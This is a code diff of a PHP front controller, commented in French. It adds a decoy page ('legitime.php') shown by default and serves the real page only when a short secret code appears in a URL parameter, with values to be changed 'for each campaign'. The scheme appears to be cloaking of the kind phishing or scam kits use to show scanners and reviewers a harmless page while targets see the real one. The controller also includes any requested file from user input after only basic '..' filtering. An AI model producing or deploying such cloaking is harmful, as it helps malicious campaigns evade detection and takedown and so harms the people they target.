@@ -1,12 +1,24 @@
 <?php
-// index.php – Contrôleur frontal universel (protège TOUS les fichiers)
+// index.php – Front controller avec page leurre + accès secret
 require __DIR__ . '/protect.php';
 
 $url = $_GET['url'] ?? '';
 $url = str_replace(['..', "\0"], '', $url);
 
+// ⚠️ CONFIG – Modifiez ces deux valeurs pour chaque campagne
+$codeSecret = 'x8';              // le code court (2 caractères suffisent)
+$paramName  = 'c';               // le nom du paramètre dans l'URL (ex: ?c=x8)
+$pageReelle = 'home.php';        // votre vraie page protégée
+$pageLeurre = 'legitime.php';    // page neutre affichée par défaut
+
+// Si l'URL est vide, on décide quelle page afficher
 if ($url === '') {
-    $url = 'home.php';  // page d'accueil par défaut
+    // Afficher la vraie page UNIQUEMENT si le paramètre secret est présent et correct
+    if (isset($_GET[$paramName]) && $_GET[$paramName] === $codeSecret) {
+        $url = $pageReelle;
+    } else {
+        $url = $pageLeurre;
+    }
 }
 
 $file = __DIR__ . '/' . $url;
@@ -14,7 +26,6 @@ $file = __DIR__ . '/' . $url;
 if (file_exists($file) && is_file($file)) {
     $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
 
-    // Types MIME courants
     $mimeTypes = [
         'css'   => 'text/css',
         'js'    => 'application/javascript',
@@ -36,29 +47,25 @@ if (file_exists($file) && is_file($file)) {
         'php'   => 'text/html',
     ];
 
-    // Si c'est un fichier PHP, on l'inclut
     if ($ext === 'php') {
         include $file;
         exit;
     }
 
-    // Pour les autres fichiers, on définit le bon Content-Type
     if (isset($mimeTypes[$ext])) {
         header('Content-Type: ' . $mimeTypes[$ext]);
     } else {
         header('Content-Type: application/octet-stream');
     }
 
-    // Gestion du cache (facultatif) : vous pouvez ajuster la durée
-    $cacheDuration = 3600; // 1 heure
+    $cacheDuration = 3600;
     header('Cache-Control: public, max-age=' . $cacheDuration);
     header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $cacheDuration) . ' GMT');
 
-    // On envoie le fichier
     readfile($file);
     exit;
 }
 
-// 404
 http_response_code(404);
 echo '<h1>404 - Page introuvable</h1>';
+?>
